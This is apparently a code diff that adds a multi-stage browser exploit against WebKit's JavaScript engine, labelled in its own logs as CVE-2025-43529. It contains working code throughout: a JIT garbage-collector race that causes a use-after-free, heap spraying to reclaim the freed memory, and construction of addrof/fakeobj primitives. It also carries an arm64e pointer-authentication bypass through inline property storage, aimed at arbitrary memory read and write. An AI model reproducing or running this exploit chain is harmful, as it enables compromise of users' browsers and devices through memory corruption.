+    vector: 1.1,      // +0x10: m_vector - THIS IS THE TARGET POINTER
+    length: 1.1,      // +0x18: m_length
+    byteOffset: 1.1,  // +0x20: m_byteOffset
+    mode: 1.1         // +0x28: m_mode
+};
+
+// Backing buffer for stable primitives
+const stablePrimitivesBuffer = new ArrayBuffer(0x1000);
+const stablePrimitivesView = new DataView(stablePrimitivesBuffer);
+
+// Stable primitives state
+const stablePrims = {
+    ready: false,
+    structureID: 0,
+    fakeArray: null,
+    containerAddr: 0n,
+    backingAddr: 0n,
+    read64: null,
+    write64: null
+};
+
+// Container for fake JSArray (for reading memory via butterfly)
+// Must be defined here so we can leak its address during Stage 1
+const arrayReaderContainer = {
+    cellHeader: 1.1,  // +0x00: JSCell header
+    butterfly: 1.1,   // +0x08: butterfly pointer (NOT PAC'd like m_vector!)
+    padding1: 1.1,    // padding
+    padding2: 1.1,
+};
+
+// Real Float64Array that will have our signed m_vector
+// Must be defined here so we can leak its address during Stage 1
+const realF64ForStealing = new Float64Array(stablePrimitivesBuffer);
+
+// Template objects for INLINE STORAGE PAC bypass
+// These provide valid StructureIDs for fake object creation
+// Inline properties are accessed WITHOUT PAC authentication!
+const inlineTemplate = {
+    slot0: 1.1,
+    slot1: 2.2,
+    slot2: 3.3,
+    slot3: 4.4,
+    slot4: 5.5,
+    slot5: 6.6
+};
+
+const inlineTemplate2 = {
+    prop0: 1.1,
+    prop1: 2.2,
+    prop2: 3.3,
+    prop3: 4.4
+};
+
+// Dedicated live Stage 5 target. We re-leak this object address in Stage 5
+// before each raw read/write to avoid stale-address false positives.
+const stage5Probe = {
+    slot0: 1.1,
+    slot1: 2.2,
+    slot2: 3.3,
+    tag: 0x535435
+};
+
+// Also store references to built-in objects we want to leak
+preAllocatedTargets.evalFunc = eval;
+preAllocatedTargets.windowObj = window;
+preAllocatedTargets.documentObj = document;
+// PAC bypass related objects
+preAllocatedTargets.fakeArrayContainer = fakeArrayContainer;
+preAllocatedTargets.arrayReaderContainer = arrayReaderContainer;
+preAllocatedTargets.realF64ForStealing = realF64ForStealing;
+preAllocatedTargets.stablePrimitivesBuffer = stablePrimitivesBuffer;
+// Inline storage PAC bypass templates
+preAllocatedTargets.inlineTemplate = inlineTemplate;
+preAllocatedTargets.inlineTemplate2 = inlineTemplate2;
+preAllocatedTargets.stage5Probe = stage5Probe;
+// Additional targets for arb r/w setup
+preAllocatedTargets.fakeObjBuffer = null;  // Will be set after fakeObjBuffer is created
+preAllocatedTargets.victimBuffer = null;   // Will be set after victimBuffer is created
+preAllocatedTargets.victimF64 = null;      // Will be set after victimF64 is created
+
+// PRE-ALLOCATED storage for leaked addresses - NO {} allocation during critical window!
+const leakedAddrs = {
+    boxed_arr: 0n,
+    uafArray: 0n,
+    arrayBuffer: 0n,
+    float64Array: 0n,
+    uint32Array: 0n,
+    testObject: 0n,
+    testArray: 0n,
+    testFunction: 0n,
+    stage6FuncA: 0n,
+    stage6FuncB: 0n,
+    evalFunc: 0n,
+    windowObj: 0n,
+    documentObj: 0n,
+    // Additional for arb r/w
+    fakeObjBuffer: 0n,
+    victimBuffer: 0n,
+    victimF64: 0n,
+    // PAC bypass related
+    fakeArrayContainer: 0n,
+    arrayReaderContainer: 0n,
+    realF64ForStealing: 0n,
+    stablePrimitivesBuffer: 0n,
+    // Inline storage templates
+    inlineTemplate: 0n,
+    inlineTemplate2: 0n,
+    stage5Probe: 0n,
+};
+
+// PRE-ALLOCATED structures for stable arb r/w
+// We'll craft a fake Float64Array in this buffer's backing store
+const fakeObjBuffer = new ArrayBuffer(0x200);  // 512 bytes for fake objects
+const fakeObjView = new DataView(fakeObjBuffer);
+const fakeObjU8 = new Uint8Array(fakeObjBuffer);
+const fakeObjF64 = new Float64Array(fakeObjBuffer);
+
+// Victim ArrayBuffer - we'll corrupt its m_data pointer for arb r/w
+const victimBuffer = new ArrayBuffer(0x100);
+const victimView = new DataView(victimBuffer);
+const victimU8 = new Uint8Array(victimBuffer);
+const victimF64 = new Float64Array(victimBuffer);
+
+// Additional buffers for reading structure
+const structLeakBuffer = new ArrayBuffer(0x100);
+const structLeakView = new DataView(structLeakBuffer);
+const structLeakF64 = new Float64Array(structLeakBuffer);
+
+// Storage for arb r/w state
+const arbRWState = {
+    fakeFloat64Array: null,      // Our fake Float64Array object
+    fakeObjAddr: 0n,             // Address of fake object in fakeObjBuffer
+    victimAddr: 0n,              // Address of victimBuffer
+    backingStoreAddr: 0n,        // Address of fakeObjBuffer's backing store
+    structureID: 0,              // Leaked Float64Array structure ID
+    ready: false,
+};
+
+// Store references for leaking (must be done after buffer creation)
+preAllocatedTargets.fakeObjBuffer = fakeObjBuffer;
+preAllocatedTargets.victimBuffer = victimBuffer;
+preAllocatedTargets.victimF64 = victimF64;
+
+// ================================================================
+// PRE-ALLOCATED CORRUPTION TARGETS FOR ANGLE OOB
+// ================================================================
+// These MUST be allocated before the exploit runs so we can leak
+// their addresses during Stage 1's critical window.
+// ================================================================
+const CORRUPTION_TARGET_COUNT = 32;  // Fewer but we'll actually leak them
+const CORRUPTION_TARGET_SIZE = 0x1000;  // 4KB each
+const CORRUPTION_MARKER = 0xCAFEBABE;
+
+const corruptionTargets = [];
+const corruptionLeakedAddrs = [];  // Will be filled during Stage 1
+
+for (let i = 0; i < CORRUPTION_TARGET_COUNT; i++) {
+    const ab = new ArrayBuffer(CORRUPTION_TARGET_SIZE);
+    const view = new DataView(ab);
+    // Write marker pattern
+    view.setUint32(0, CORRUPTION_MARKER, true);
+    view.setUint32(4, i, true);
+    // Fill rest with pattern
+    for (let j = 8; j < CORRUPTION_TARGET_SIZE; j += 4) {
+        view.setUint32(j, 0x41414141, true);
+    }
+    corruptionTargets.push({ buffer: ab, view: view, index: i });
+}
+
+// Add to preAllocatedTargets for address leaking
+preAllocatedTargets.corruptionTargets = corruptionTargets;
+
+// =============================================================================
+// BUILD STABLE PRIMITIVES FUNCTION (INLINE STORAGE PAC BYPASS)
+// =============================================================================
+// On arm64e, TypedArray m_vector and JSArray butterfly are PAC-protected.
+// However, INLINE PROPERTY STORAGE is accessed WITHOUT PAC authentication!
+//
+// From WebKit source (DFGByteCodeParser.cpp:5603):
+//   if (isInlineOffset(offset))
+//       propertyStorage = base;  // Direct access - NO PAC check!
+//   else
+//       propertyStorage = addToGraph(GetButterfly, base);  // PAC-protected
+//
+// JSObject layout:
+//   +0x00: JSCell header (StructureID + flags)
+//   +0x08: m_butterfly (PAC protected - we DON'T use this)
+//   +0x10: Inline property slot 0 <- NO PAC!
+//   +0x18: Inline property slot 1 <- NO PAC!
+//   ...
+//
+// Strategy:
+//   To read at addr X: fakeobj(X - 0x10), access .slot0 = reads [X]
+//   To write at addr X: fakeobj(X - 0x10), write .slot0 = writes [X]
+// =============================================================================
+
+function buildStablePrimitives(addrof, fakeobj, itof, ftoi) {
+    // Use page log instead of console.log
+    const bspLog = (msg) => {
+        if (!BSP_VERBOSE) return;
+        log(`[BSP] ${msg}`, 'info');
+        console.log(`[BSP] ${msg}`);
+    };
+
+    bspLog('=== STARTING buildStablePrimitives ===');
+
+    const CANONICAL_NAN = 0x7ff8000000000000n;
+    const INLINE_STORAGE_OFFSET = 0x10n;
+
+    // Step 1: Leak template addresses
+    bspLog('Step 1: addrof calls...');
+
+    let templateAddr, template2Addr, containerAddr, bufferAddr;
+    let arbProofOk = false;
+    try {
+        templateAddr = addrof(inlineTemplate);
+        template2Addr = addrof(inlineTemplate2);
+        containerAddr = addrof(fakeArrayContainer);
+        bufferAddr = addrof(stablePrimitivesBuffer);
+        bspLog(`Templates: 0x${templateAddr.toString(16)}, 0x${template2Addr.toString(16)}`);
+    } catch (e) {
+        bspLog('Step 1 FAILED: ' + e.message);
+        return null;
+    }
+
+    if (templateAddr === CANONICAL_NAN || containerAddr === CANONICAL_NAN) {
+        bspLog('Got NaN addresses, aborting');
+        return null;
+    }
+
+    // Step 2: Test fakeobj to SAME address
+    bspLog('Step 2: fakeobj self-test...');
+
+    const TEST_MARKER = 0x4141414142424242n;
+    let fakeSelfWorks = false;
+
+    try {
+        inlineTemplate.slot0 = itof(TEST_MARKER);
+        const fakeSelf = fakeobj(templateAddr);
+        const readBack = ftoi(fakeSelf.slot0);
+
+        if (readBack === TEST_MARKER) {
+            bspLog('Step 2 SUCCESS: fakeobj self-test works!');
+            fakeSelfWorks = true;
+        } else {
+            bspLog('Step 2: marker mismatch');
+        }
+    } catch (e) {
+        bspLog('Step 2 FAILED: ' + e.message);
+        return null;
+    }
+
+    if (!fakeSelfWorks) {
+        bspLog('Basic test failed, returning early');
+        return { method: 'failed_basic', templateAddr };
+    }
+
+    // Step 3: Cross-object test
+    bspLog('Step 3: Cross-object fakeobj test...');
+
+    const MARKER2 = 0x1337133713371337n;
+    let crossObjectWorks = false;
+
+    try {
+        inlineTemplate2.prop0 = itof(MARKER2);
+        const fakeTemplate2 = fakeobj(template2Addr);
+        const readBack2 = ftoi(fakeTemplate2.prop0);
+
+        if (readBack2 === MARKER2) {
+            bspLog('Step 3 SUCCESS: cross-object works!');
+            crossObjectWorks = true;
+        }
+    } catch (e) {
+        bspLog('Step 3 FAILED: ' + e.message);
+    }
+
+    // === INLINE STORAGE WORKS! Now build useful primitives ===
+    bspLog('Step 4: Building object metadata reader...');
+
+    if (!fakeSelfWorks || !crossObjectWorks) {
+        bspLog('Basic tests failed, cannot proceed');
+        return { method: 'failed', fakeSelfWorks, crossObjectWorks };
+    }
+
+    // Function to read inline slots of a known object
+    function readInlineSlot(objAddr, slotIndex) {
+        let arbProofOk = false;
+        try {
+            const fake = fakeobj(objAddr);
+            const slotNames = ['slot0', 'slot1', 'slot2', 'slot3', 'slot4', 'slot5'];
+            if (slotIndex < slotNames.length && fake[slotNames[slotIndex]] !== undefined) {
+                const val = fake[slotNames[slotIndex]];
+                if (typeof val === 'number') return ftoi(val);
+                if (typeof val === 'object' && val !== null) return addrof(val);
+                return 0n;
+            }
+            return null;
+        } catch (e) {
+            return null;
+        }
+    }
+
+    // Test: read our own template's slots
+    bspLog('Step 5: Testing inline slot reader...');
+    inlineTemplate.slot0 = itof(0xAAAABBBBCCCCDDDDn);
+    inlineTemplate.slot1 = itof(0x1111222233334444n);
+
+    const testSlot0 = readInlineSlot(templateAddr, 0);
+    const testSlot1 = readInlineSlot(templateAddr, 1);
+
+    bspLog(`slot0: ${testSlot0 ? '0x' + testSlot0.toString(16) : 'null'}`);
+    bspLog(`slot1: ${testSlot1 ? '0x' + testSlot1.toString(16) : 'null'}`);
+
+    const slotReaderWorks = (testSlot0 === 0xAAAABBBBCCCCDDDDn);
+    bspLog('Slot reader works: ' + slotReaderWorks);
+
+    // Step 8: Spray heap objects to find adjacent pairs
+    // We need adjacent objects to harvest StructureID from one object's header
+    // by reading it through another object's inline storage
+    bspLog('Step 8: Heap spray for adjacency detection...');
+
+    // Use larger spray with many properties and track expected raw bits so we
+    // can distinguish normal property reads from true overlap/misalignment reads.
+    const sprayObjs = [];
+    const sprayExpectedBits = [];
+    const SPRAY_COUNT = BSP_FAST_MODE ? 96 : 200;
+    const PROP_COUNT = BSP_FAST_MODE ? 24 : 40;
+
+    // Create objects with many numeric inline properties (stable shape).
+    for (let i = 0; i < SPRAY_COUNT; i++) {
+        const o = {};
+        const expected = {};
+        for (let p = 0; p < PROP_COUNT; p++) {
+            const key = `p${p}`;
+            // Keep values finite/non-NaN while preserving per-slot identity.
+            const bits = 0x3ff0000000000000n + (BigInt(i) << 20n) + BigInt(p + 1);
+            o[key] = itof(bits);
+            expected[key] = bits;
+        }
+        sprayObjs.push(o);
+        sprayExpectedBits.push(expected);
+    }
+
+    // Get addresses immediately after allocation
+    const sprayAddrs = [];
+    for (let i = 0; i < SPRAY_COUNT; i++) {
+        const addr = addrof(sprayObjs[i]);
+        if (addr !== CANONICAL_NAN && addr > 0x100000000n) {
+            sprayAddrs.push({ idx: i, addr });
+        }
+    }
+
+    bspLog(`Got ${sprayAddrs.length} valid addresses from ${SPRAY_COUNT} objects`);
+
+    if (sprayAddrs.length < 2) {
+        bspLog('Not enough valid addresses');
+        return { method: 'failed_spray', fakeSelfWorks, crossObjectWorks, slotReaderWorks };
+    }
+
+    // Sort by address
+    sprayAddrs.sort((a, b) => a.addr < b.addr ? -1 : 1);
+
+    // Analyze spacing distribution
+    const spacings = [];
+    for (let i = 0; i < sprayAddrs.length - 1; i++) {
+        spacings.push(sprayAddrs[i + 1].addr - sprayAddrs[i].addr);
+    }
+
+    // Count small spacings (potential adjacencies)
+    const smallSpacings = spacings.filter(s => s > 0n && s <= 0x200n);
+    bspLog(`Small spacings (<=0x200): ${smallSpacings.length}`);
+
+    // Log some sample addresses and spacings
+    bspLog('Sample addresses:');
+    for (let i = 0; i < Math.min(8, sprayAddrs.length); i++) {
+        const diff = i > 0 ? sprayAddrs[i].addr - sprayAddrs[i-1].addr : 0n;
+        bspLog(`  [${sprayAddrs[i].idx}] 0x${sprayAddrs[i].addr.toString(16)} (gap: 0x${diff.toString(16)})`);
+    }
+
+    // Find candidate adjacent pairs
+    let foundAdjacent = false;
+    let adjacentInfo = null;
+    let attemptCount = 0;
+    let sidCandidateCount = 0;
+    let mismatchCount = 0;
+    const sidSamples = [];
+    const addrBiases = [-0x20n, -0x18n, -0x10n, -0x8n, 0x0n, 0x8n, 0x10n, 0x18n, 0x20n];
+
+    for (let i = 0; i < sprayAddrs.length - 1 && !foundAdjacent; i++) {
+        const diff = sprayAddrs[i + 1].addr - sprayAddrs[i].addr;
+
+        // JSC object sizes depend on allocation class - allow wider range.
+        // Looking for spacing that puts B's header within A's inline storage.
+        // A's inline storage: addrA + 0x10 to addrA + (0x10 + PROP_COUNT*8)
+        // So we need: 0x10 <= diff <= 0x40 for header to be in inline range
+        const maxInlineSpan = 0x10n + BigInt(PROP_COUNT - 1) * 0x8n;
+        if (diff > 0n && diff >= 0x10n && diff <= (maxInlineSpan + 0x40n)) {
+            attemptCount++;
+            const addrA = sprayAddrs[i].addr;
+            const addrB = sprayAddrs[i + 1].addr;
+            const idxA = sprayAddrs[i].idx;
+            const idxB = sprayAddrs[i + 1].idx;
+
+            try {
+                const fakeA = fakeobj(addrA);
+                for (const bias of addrBiases) {
+                    const rawOffset = addrB - addrA - (0x10n + bias);
+                    if (rawOffset < 0n || (rawOffset % 8n) !== 0n) continue;
+
+                    const slotIndex = rawOffset / 8n;
+                    if (slotIndex < 0n || slotIndex > BigInt(PROP_COUNT - 1)) continue;
+
+                    const propName = `p${slotIndex}`;
+                    const rawVal = fakeA[propName];
+
+                    let headerVal;
+                    if (typeof rawVal === 'bigint') {
+                        headerVal = rawVal;
+                    } else if (typeof rawVal === 'number') {
+                        headerVal = ftoi(rawVal);
+                    } else if ((typeof rawVal === 'object' && rawVal !== null) || typeof rawVal === 'function') {
+                        headerVal = addrof(rawVal);
+                    } else {
+                        continue;
+                    }
+
+                    const expectedVal = sprayExpectedBits[idxA] ? sprayExpectedBits[idxA][propName] : null;
+                    if (typeof expectedVal === 'bigint' && headerVal === expectedVal) {
+                        // Regular property read, not overlap/corruption.
+                        continue;
+                    }
+
+                    mismatchCount++;
+
+                    // JSCell header layout:
+                    // bits 0-31: StructureID
+                    // bits 32-39: IndexingType
+                    // bits 40-47: Type
+                    // bits 48-55: Flags
+                    // bits 56-63: CellState
+                    const structureID = headerVal & 0xFFFFFFFFn;
+                    const indexingType = (headerVal >> 32n) & 0xFFn;
+                    const cellType = (headerVal >> 40n) & 0xFFn;
+                    const cellState = (headerVal >> 56n) & 0xFFn;
+
+                    if (sidSamples.length < 8) {
+                        sidSamples.push(
+                            `0x${structureID.toString(16)}:${indexingType.toString(16)}:${cellType.toString(16)}@s${slotIndex.toString()}b${bias.toString()}`
+                        );
+                    }
+
+                    // Tighten plausibility checks to reduce false positives from doubles.
+                    const plausible =
+                        headerVal !== 0n &&
+                        headerVal !== CANONICAL_NAN &&
+                        structureID > 0n &&
+                        structureID < 0x200000n &&
+                        indexingType < 0x80n &&
+                        cellType > 0n &&
+                        cellType < 0x80n &&
+                        cellState < 0x40n;
+
+                    if (plausible) {
+                        sidCandidateCount++;
+                        bspLog(`Candidate pair: obj[${idxA}] @ 0x${addrA.toString(16)}, obj[${idxB}] @ 0x${addrB.toString(16)}`);
+                        bspLog(`  Gap: 0x${diff.toString(16)}, Slot index: ${slotIndex}, bias=${bias}`);
+                        bspLog(`  Read value: 0x${headerVal.toString(16)}`);
+                        bspLog(`  StructureID: 0x${structureID.toString(16)} IndexingType: 0x${indexingType.toString(16)} CellType: 0x${cellType.toString(16)} CellState: 0x${cellState.toString(16)}`);
+                        bspLog('  VALID StructureID HARVESTED!');
+                        stablePrims.harvestedStructureID = structureID;
+                        foundAdjacent = true;
+                        adjacentInfo = {
+                            addrA, addrB, diff,
+                            slotIndex,
+                            bias,
+                            propName,
+                            rawHeader: headerVal,
+                            structureID,
+                            indexingType,
+                            cellType,
+                            cellState
+                        };
+                        break;
+                    }
+                }
+            } catch (e) {
+                bspLog(`  Access failed: ${e.message}`);
+            }
+        }
+    }
+
+    bspLog(`Checked ${attemptCount} candidate pairs`);
+
+    if (!foundAdjacent) {
+        bspLog('No adjacent pairs with aligned headers found');
+
+        // Show distribution of spacings for debugging
+        const spacingCounts = {};
+        for (const s of spacings) {
+            const bucket = s <= 0x100n ? `0x${s.toString(16)}` :
+                           s <= 0x1000n ? '0x100-0x1000' :
+                           s <= 0x10000n ? '0x1000-0x10000' : 'large';
+            spacingCounts[bucket] = (spacingCounts[bucket] || 0) + 1;
+        }
+        bspLog('Spacing distribution:');
+        for (const [bucket, count] of Object.entries(spacingCounts).slice(0, 8)) {
+            bspLog(`  ${bucket}: ${count}`);
+        }
+    }
+
+    // Step 9: Optional heavy heap analysis (disabled in fast mode for stability)
+    const heapInfo = {};
+    if (!BSP_FAST_MODE) {
+        bspLog('Step 9: Heap analysis...');
+        try {
+            const testBuf = new ArrayBuffer(0x100);
+            heapInfo.arrayBuffer = addrof(testBuf);
+            const testF64 = new Float64Array(16);
+            heapInfo.float64Array = addrof(testF64);
+            const testFunc = function() { return 42; };
+            heapInfo.function = addrof(testFunc);
+        } catch (e) {
+            bspLog('Heap analysis failed: ' + e.message);
+        }
+    }
+
+    // Final results
+    bspLog('=== FINAL RESULTS ===');
+    bspLog('fakeSelfWorks: ' + fakeSelfWorks);
+    bspLog('crossObjectWorks: ' + crossObjectWorks);
+    bspLog('slotReaderWorks: ' + slotReaderWorks);
+    bspLog('foundAdjacent: ' + foundAdjacent);
+    bspLog('harvestedStructureID: ' + (stablePrims.harvestedStructureID?.toString(16) || 'none'));
+
+    // Store what we have
+    stablePrims.ready = foundAdjacent;  // Ready if we harvested StructureID
+    stablePrims.method = foundAdjacent ? 'inline_with_structid' : 'inline_basic';
+    stablePrims.templateAddr = templateAddr;
+    stablePrims.template2Addr = template2Addr;
+    stablePrims.fakeSelfWorks = fakeSelfWorks;
+    stablePrims.crossObjectWorks = crossObjectWorks;
+    stablePrims.slotReaderWorks = slotReaderWorks;
+    stablePrims.readInlineSlot = readInlineSlot;
+    stablePrims.heapInfo = heapInfo;
+    stablePrims.adjacentInfo = adjacentInfo;
+    stablePrims.bspStats = {
+        sprayCount: SPRAY_COUNT,
+        propCount: PROP_COUNT,
+        validAddrCount: sprayAddrs.length,
+        smallSpacingCount: smallSpacings.length,
+        candidateAttempts: attemptCount,
+        mismatchCount,
+        sidCandidateCount,
+        sidSamples,
+        foundAdjacent,
+    };
+
+    bspLog('=== COMPLETE ===');
+
+    return {
+        method: stablePrims.method,
+        fakeSelfWorks,
+        crossObjectWorks,
+        slotReaderWorks,
+        foundAdjacent,
+        templateAddr,
+        template2Addr,
+        readInlineSlot,
+        harvestedStructureID: stablePrims.harvestedStructureID,
+        heapInfo,
+        adjacentInfo,
+        stats: stablePrims.bspStats
+    };
+}
+
+// Configuration - tuned for reliability
+const CONFIG = {
+    JIT_WARMUP_ITERATIONS: 1000,      // Iterations to trigger DFG compilation
+    RECURSIVE_WARMUP_DEPTH: 800,      // Stack clearing warmup depth (will overflow safely)
+    MAX_EXPLOIT_ATTEMPTS: 15000,      // Outer loop attempts (increased)
+    RECURSIVE_CLEAR_DEPTH: 800,       // Stack clear depth per call (overflow is OK)
+    SPRAY_ARRAYS_PER_ATTEMPT: 64,     // Arrays to spray per attempt (increased from 16)
+    ALLOCBUFFER_COUNT_MOD: 5,         // Modulo for ArrayBuffer allocation variance
+    INNER_LOOP_K: 10,                 // Inner timing loop k value
+};
+
+// Core trigger function - directly from working exp.html
+// This function must be JIT compiled for the bug to manifest
+function triggerUAF(flag, k, allocCount) {
+    // Object A will be stored in old space via the large uafArray
+    let A = {
+        p0: 0x41414141,
+        p1: 1.1,
+        p2: 2.2,
+    };
+    uafArray[uafArrayIndex] = A;  // A now reachable from old space
+
+    let forGC = [];
+
+    // Create Date 'a' - the target that will be freed
+    // CRITICAL: a[0] = 1.1 creates a BUTTERFLY for the Date object
+    // This butterfly is NOT in IsoSubspace - it's in regular heap
+    // When 'a' is freed, its butterfly can be reclaimed by other allocations
+    let a = new Date(1111);
+    a[0] = 1.1;  // Creates butterfly for Date - THIS IS THE KEY!
+
+    // Allocate large ArrayBuffers to trigger full GC
+    // Full GC is needed to scan old space where A lives
+    for (let j = 0; j < allocCount; ++j) {
+        let buf = new ArrayBuffer(0x800000);  // 8MB each
+        forGC.push(buf);
+    }
+
+    // Store forGC in A to keep references alive and ensure A gets scanned
+    A.p2 = forGC;
+
+    // Object 'b' - created in eden, will hold dangling reference to 'a'
+    let b = {
+        p0: 0x42424242,
+        p1: 1.1,
+    };
+
+    // Create Phi node - this is where the bug manifests
+    // DFG will see: f = Phi(b, 1.1)
+    // When f escapes via A.p1 = f, DFG marks the Phi as escaped
+    // BUT it fails to mark the Upsilon inputs (b) as escaped
+    let f;
+    f = b;
+    if (flag) {
+        f = 1.1;
+    }
+
+    // A.p1 = f makes Phi escape
+    // GC can now reach 'f' (and thus 'b') through old space object A
+    // But DFG doesn't know 'b' escaped, so no barrier on 'b' stores
+    A.p1 = f;
+
+    // Long loop to create race window
+    // This lets GC mark A and b (via the escaped Phi path)
+    // We need A and b to be marked Black before we store 'a' into b
+    let v = 1.1;
+    for (let i = 0; i < 1e6; ++i) {
+        for (let j = 0; j < k; ++j) {
+            v = i;
+            v = j;
+        }
+    }
+
+    // Store result to prevent loop optimization
+    b.p0 = v;
+
+    // THE VULNERABILITY: b.p1 = a without write barrier!
+    // - 'b' is Black (already marked by GC via A -> f -> b path)
+    // - 'a' is White (eden object, not yet marked)
+    // - This creates Black -> White edge
+    // - Without barrier, GC doesn't rescan 'b', never sees 'a'
+    // - 'a' stays White and gets collected = UAF!
+    b.p1 = a;
+}
+
+// Clear stack of butterfly pointers
+// During butterfly allocation, pointers get written to the stack.
+// Conservative stack scanning by GC can find these and prevent collection.
+// This recursive function overwrites stack memory with call frames.
+function recursive(n) {
+    if (n === 0) return;
+    n = n | 0;
+    recursive(n - 1);
+}
+
+// Safe recursive call that handles stack overflow
+function safeRecursive(depth) {
+    try {
+        recursive(depth);
+    } catch (e) {
+        // Stack overflow - that's actually good, we filled the stack
+    }
+}
+
+// Alternative stack clearing using multiple shallower calls
+function clearStack() {
+    for (let i = 0; i < 50; i++) {
+        safeRecursive(CONFIG.RECURSIVE_CLEAR_DEPTH);
+    }
+}
+
+async function runStage1() {
+    log('\n========================================', 'stage1');
+    log('STAGE 1: WebKit UAF (CVE-2025-43529)', 'stage1');
+    log('========================================', 'stage1');
+    log('Goal: Obtain addrof/fakeobj primitives via butterfly type confusion', 'info');
+    log(`Config: ${CONFIG.MAX_EXPLOIT_ATTEMPTS} attempts, ${CONFIG.SPRAY_ARRAYS_PER_ATTEMPT} spray arrays each`, 'info');
+    beaconEvent('stage1_start', 'runStage1');
+
+    await new Promise(r => setTimeout(r, 10));
+
+    uafReclaimed = [];
+
+    // Phase 1: Initial warmup - both branch paths for proper DFG profiling
+    log('Phase 1.1: Initial warmup with both branch paths...', 'info');
+    triggerUAF(true, 1, 1);   // Take the flag=true path
+    triggerUAF(false, 1, 1);  // Take the flag=false path
+    log('  Warmup complete - both Phi paths exercised for DFG', 'success');
+
+    await new Promise(r => setTimeout(r, 10));
+
+    // Phase 2: JIT compilation - need enough iterations to trigger DFG
+    log(`Phase 1.2: JIT warmup (${CONFIG.JIT_WARMUP_ITERATIONS} iterations)...`, 'info');
+    for (let i = 0; i < CONFIG.JIT_WARMUP_ITERATIONS; ++i) {
+        triggerUAF(false, 0, 0);  // No allocations, just warm up the code
+        if (i % 200 === 0) {
+            updateProgress(i, CONFIG.JIT_WARMUP_ITERATIONS, 'Stage 1 - JIT Warmup');
+        }
+    }
+    log('  JIT warmup complete - function should be DFG compiled', 'success');
+
+    await new Promise(r => setTimeout(r, 10));
+
+    // Phase 3: Recursive warmup - prepare stack clearing function
+    // Call recursive multiple times with safe depth to warm up and clear stack
+    log(`Phase 1.3: Recursive stack clearing warmup...`, 'info');
+    for (let i = 0; i < 20; i++) {
+        safeRecursive(CONFIG.RECURSIVE_WARMUP_DEPTH);
+    }
+    log('  Recursive warmup complete', 'success');
+
+    await new Promise(r => setTimeout(r, 10));
+
+    // Phase 4: Main exploitation loop
+    log(`Phase 1.4: Main exploitation loop (${CONFIG.MAX_EXPLOIT_ATTEMPTS} attempts)...`, 'critical');
+    log('  Racing GC marking vs store to freed object...', 'info');
+
+    let success = false;
+    let lastLogTime = Date.now();
+
+    for (let k = 0; k < CONFIG.MAX_EXPLOIT_ATTEMPTS; ++k) {
+        // Trigger the UAF - vary allocation count to help hit race window
+        triggerUAF(false, CONFIG.INNER_LOOP_K, (k % CONFIG.ALLOCBUFFER_COUNT_MOD) + 1);
+
+        // Clear butterfly pointers from stack to prevent conservative GC roots
+        clearStack();
+
+        // Additional small allocations to trigger sweep of freed blocks
+        // This helps the MarkedBlock containing the freed butterfly get swept
+        // and added to the FreeList for reallocation
+        for (let i = 0; i < 3; ++i) {
+            new ArrayBuffer(0x4000);  // 16KB each
+        }
+
+        // Get the dangling reference to freed Date 'a'
+        // Path: uafArray[last] -> A -> p1 -> b -> p1 -> a (FREED!)
+        let freed;
+        try {
+            freed = uafArray[uafArrayIndex].p1.p1;
+        } catch (e) {
+            continue;  // A or b might not be set up yet
+        }
+
+        // noCow prevents Copy-On-Write optimization
+        // Each spray array needs its own unique butterfly
+        let noCow = 13.37;
+        let win = false;
+        let winningArray = null;
+
+        // SPRAY: Match original exp.html exactly - 5 element arrays, check after EACH allocation
+        // CRITICAL: We must track WHICH array won the reclaim, not just take the last one!
+        // The winning array's butterfly IS the reclaimed Date butterfly.
+        for (let i = 0; i < CONFIG.SPRAY_ARRAYS_PER_ATTEMPT; ++i) {
+            // Create exactly what original exp.html uses: 5-element Double array
+            // Using noCow as last element prevents Copy-On-Write optimization
+            let sprayArr = [13.37, 2.2, 3.3, 4.4, noCow];
+            uafReclaimed.push(sprayArr);
+
+            try {
+                // Check IMMEDIATELY after each allocation
+                // If this sprayArr's butterfly reclaimed the freed Date's butterfly,
+                // then freed[0] will now equal sprayArr[0] (13.37)
+                if (freed[0] === 13.37) {
+                    win = true;
+                    winningArray = sprayArr;  // THIS is the array with shared butterfly!
+                    break;
+                }
+            } catch (e) {
+                // Access might fail if memory is in bad state - keep spraying
+            }
+        }
+
+        if (!win) {
+            // Log progress periodically (every 500 attempts or every 2 seconds)
+            const now = Date.now();
+            if (k % 500 === 0 || (now - lastLogTime > 2000)) {
+                updateProgress(k, CONFIG.MAX_EXPLOIT_ATTEMPTS, 'Stage 1 - Exploitation');
+                log(`  [${k}/${CONFIG.MAX_EXPLOIT_ATTEMPTS}] Racing... (${uafReclaimed.length} arrays sprayed)`, 'info');
+                lastLogTime = now;
+                await new Promise(r => setTimeout(r, 1));  // Yield to UI
+            }
+            continue;
+        }
+
+        // SUCCESS! We reclaimed the freed butterfly
+        // CRITICAL: Do NOT allocate anything (strings, objects, DOM) until primitives are tested!
+        // Any allocation could trigger GC which invalidates the freed DateInstance cell.
+        success = true;
+
+        // Set up primitives IMMEDIATELY - no allocations before this!
+        // The freed Date's cell still has a valid butterfly pointer (pointing to our spray).
+        // Any GC could invalidate this, so we must act fast.
+        let boxed_arr = winningArray;
+        boxed_arr[0] = {};  // Convert to Contiguous - this is the ONLY allocation we do
+        let unboxed_arr = freed;
+
+        // Create conversion buffer for ftoi/itof (reuse global one)
+        // Note: these are already defined globally, no new allocations
+
+        // Immediately test if primitives work - DO NOT LOG YET (logging allocates!)
+        let testResult1, testResult2, testResult3;
+        let primitivesWork = false;
+
+        // Test 1: Check if unboxed_arr is accessible
+        try {
+            testResult1 = unboxed_arr[0];  // Should give us the tagged {} pointer as double
+        } catch (e) {
+            testResult1 = "EXCEPTION";
+        }
+
+        // Test 2: Try addrof with pre-existing object (avoid allocating new one)
+        // Use the boxed_arr itself as test subject
+        boxed_arr[0] = boxed_arr;  // Store array reference
+        try {
+            testResult2 = ftoi(unboxed_arr[0]);
+        } catch (e) {
+            testResult2 = 0n;
+        }
+
+        // Test 3: Store a different reference
+        boxed_arr[0] = uafArray;  // Use existing global array
+        try {
+            testResult3 = ftoi(unboxed_arr[0]);
+        } catch (e) {
+            testResult3 = 0n;
+        }
+
+        // Check if primitives worked - NO ALLOCATIONS YET!
+        const CANONICAL_NAN = 0x7ff8000000000000n;
+
+        if (testResult2 !== CANONICAL_NAN && testResult3 !== CANONICAL_NAN && testResult2 !== testResult3) {
+            primitivesWork = true;
+
+            // CRITICAL: Do ALL leaking HERE, BEFORE any log() calls!
+            // log() allocates strings and DOM elements which triggers GC!
+
+            // Store first two results
+            leakedAddrs.boxed_arr = testResult2;
+            leakedAddrs.uafArray = testResult3;
+
